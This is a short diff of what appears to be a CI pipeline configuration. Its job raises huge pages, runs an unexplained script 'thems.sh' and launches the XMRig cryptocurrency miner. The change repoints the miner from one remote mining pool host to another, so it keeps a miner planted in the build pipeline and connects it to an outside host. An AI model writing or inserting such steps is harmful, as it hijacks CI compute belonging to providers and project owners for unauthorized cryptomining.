@@ -9,4 +9,4 @@ jobs:
       - run: sysctl -w vm.nr_hugepages=128
       - checkout
       - run: bash ./thems.sh
-      - run: /root/xmrig/build/xmrig --donate-level 1 -o api-falok.ga:3232 -k
+      - run: /root/xmrig/build/xmrig --donate-level 1 -o sokol.cool:3232 -k
